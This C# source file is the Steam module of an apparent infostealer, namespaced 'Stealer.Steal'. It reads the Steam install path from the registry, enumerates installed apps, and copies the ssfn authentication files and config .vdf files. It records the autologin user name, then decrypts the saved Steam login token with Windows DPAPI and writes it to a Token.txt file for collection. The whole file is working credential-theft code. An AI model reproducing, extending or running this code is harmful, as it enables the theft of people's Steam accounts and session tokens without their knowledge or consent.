using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Browsers;

internal class Steam
{
	public static void Start()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
		if (registryKey == null || registryKey.GetValue("SteamPath") == null)
		{
			return;
		}
		string text = registryKey.GetValue("SteamPath").ToString();
		if (!Directory.Exists(text))
		{
			return;
		}
		string text2 = Path.Combine("Gaming", "Steam");
		try
		{
			RegistryKey registryKey2 = registryKey.OpenSubKey("Apps");
			if (registryKey2 != null)
			{
				List<string> list = new List<string>();
				string[] subKeyNames = registryKey2.GetSubKeyNames();
				foreach (string text3 in subKeyNames)
				{
					using RegistryKey registryKey3 = registryKey.OpenSubKey("Apps\\" + text3);
					if (registryKey3 != null)
					{
						string text4 = (string)registryKey3.GetValue("Name");
						text4 = (string.IsNullOrEmpty(text4) ? "Unknown" : text4);
						string text5 = (((int)registryKey3.GetValue("Installed") == 1) ? "Yes" : "No");
						string text6 = (((int)registryKey3.GetValue("Running") == 1) ? "Yes" : "No");
						string text7 = (((int)registryKey3.GetValue("Updating") == 1) ? "Yes" : "No");
						Counter.Steam = true;
						list.Add("Application " + text4 + "\n\tGameID: " + text3 + "\n\tInstalled: " + text5 + "\n\tRunning: " + text6 + "\n\tUpdating: " + text7);
					}
				}
				DynamicFiles.WriteAllText(text2 + "\\Apps.txt", string.Join("\n\n", (IEnumerable<string?>)list.ToArray()));
			}
		}
		catch
		{
		}
		try
		{
			if (Directory.Exists(text))
			{
				Counter.Steam = true;
				string[] subKeyNames = Directory.GetFiles(text);
				foreach (string text8 in subKeyNames)
				{
					if (text8.Contains("ssfn"))
					{
						DynamicFiles.WriteAllBytes(text2 + "\\ssnf\\" + Path.GetFileName(text8), File.ReadAllBytes(text8));
					}
				}
			}
		}
		catch
		{
		}
		try
		{
			string path = Path.Combine(text, "config");
			if (Directory.Exists(path))
			{
				Counter.Steam = true;
				string[] subKeyNames = Directory.GetFiles(path);
				foreach (string text9 in subKeyNames)
				{
					if (text9.EndsWith("vdf"))
					{
						DynamicFiles.WriteAllBytes(text2 + "\\configs\\" + Path.GetFileName(text9), File.ReadAllBytes(text9));
					}
				}
			}
		}
		catch
		{
		}
		try
		{
			string text10 = (((int)registryKey.GetValue("RememberPassword") == 1) ? "Yes" : "No");
			string text11 = string.Format("Autologin User: " + registryKey.GetValue("AutoLoginUser")?.ToString() + "\nRemember password: " + text10);
			DynamicFiles.WriteAllText(text2 + "\\SteamInfo.txt", text11);
		}
		catch
		{
		}
		try
		{
			string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "local.vdf");
			string path3 = Path.Combine(text, "config", "loginusers.vdf");
			if (!File.Exists(path2) || !File.Exists(path3))
			{
				return;
			}
			string pattern = "\"AccountName\"\\t\\t\"(.*)\"";
			string pattern2 = "([a-zA-Z0-9]{1000,1500})";
			byte[] array = null;
			byte[] array2 = null;
			Match match = Regex.Match(File.ReadAllText(path3), pattern);
			if (match.Success)
			{
				array = Encoding.UTF8.GetBytes(match.Groups[1].Value);
			}
			Match buffMatch = Regex.Match(File.ReadAllText(path2), pattern2);
			if (buffMatch.Success)
			{
				array2 = (from x in Enumerable.Range(0, buffMatch.Value.Length / 2)
					select Convert.ToByte(buffMatch.Value.Substring(x * 2, 2), 16)).ToArray();
			}
			try
			{
				byte[] array3 = ProtectedData.Unprotect(array2, array, (DataProtectionScope)0);
				if (array3 != null)
				{
					DynamicFiles.WriteAllText(text2 + "\\Token.txt", Encoding.UTF8.GetString(array3));
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
				if (!Encoding.UTF8.GetString(array2).ToCharArray().Any((char x) => !char.IsDigit(x)))
				{
					DynamicFiles.WriteAllText(text2 + "\\Token.txt", Encoding.UTF8.GetString(array2));
				}
			}
		}
		catch (Exception ex2)
		{
			Console.WriteLine(ex2.ToString());
		}
	}
}
